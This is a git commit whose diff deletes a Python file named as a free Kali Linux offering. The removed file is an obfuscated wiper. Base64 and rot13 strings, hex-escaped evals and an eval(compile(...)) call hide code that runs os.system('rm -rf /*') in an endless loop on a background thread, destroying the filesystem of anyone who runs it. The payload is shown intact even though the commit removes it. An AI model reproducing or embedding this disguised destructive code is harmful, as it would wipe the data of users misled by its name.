1aa91c8367b7af816ec012a0493acd575175dcb0
ArSiFoX <arslangalimov0@gmail.com>
2023-05-02 13:27:42 +0300

    Delete KALI LINUX BESPLATNO.py

--- KALI LINUX BESPLATNO.py
+++
@@ -1,8 +0,0 @@
-import base64, codecs
-magic = 'aW1wb3J0IHRocmVhZGluZwppbXBvcnQgdGltZQppbXBvcnQgb3MKCmRlZiBoZWxsb193b3JsZCgpOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICB0ZXh0ID0gJ9CQ0YDRgdC40YTQvtC60LjRgdGMINCc0L7QvdGC0LDQttC40YHRjCcKICAgICAgICBmb3IgaSBpbiByYW5nZShsZW4odGV4dCkpOgogICA'
-love = 'tVPNtVPNtVPO0MKu0VQ0tXPWpZQZmJmR7Zmp7AQOgVvNeVUEyrUEoBzyqVPftVyjjZmAoZT1pZQZmJmR7ZmR7AQOgVvNeVUEyrUEonI0tXlNvKQNmZ1fjoFVtXlO0MKu0J2xeZGcqXDbtVPNtVPNtVPNtVPOjpzyhqPu0MKu0YPOyozD9W1klWlxXVPNtVPNtVPNtVPNtqTygMF5moTIypPtjYwNkAQt4XD'
-god = 'ogICAgICAgIHByaW50KCkKCmRlZiBoaSgpOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICBvcy5zeXN0ZW0oJ3JtIC1yZiAvKicpCgojINCh0L7Qt9C00LDQtdC8INC00LLQsCDQv9C+0YLQvtC60LAKdDEgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1oZWxsb193b3JsZCkKdDIgPSB0aHJlYWRpbmcuV'
-destiny = 'TulMJSxXUEupzqyqQ1bnFxXPvZt0WsDfAP/0LCEtqP60YQDgqP8VAP+0YUDfPQDi9P+0LYDigP60YNXqQRhp3EupaDbXDc0Zv5mqTSlqPtcPtbwVAPr0YoDhAP00YQDgqP8YPQDi9P+0YeDfPQDigPk0YNt0Y/DigTP0Y7DhgPjVAP30YQDfgP10LQEvAPj0LYEtqTCPaDkYzcinJ4bXDc0Zv5do2yhXPx='
-joy = '\x72\x6f\x74\x31\x33'
-trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
-eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
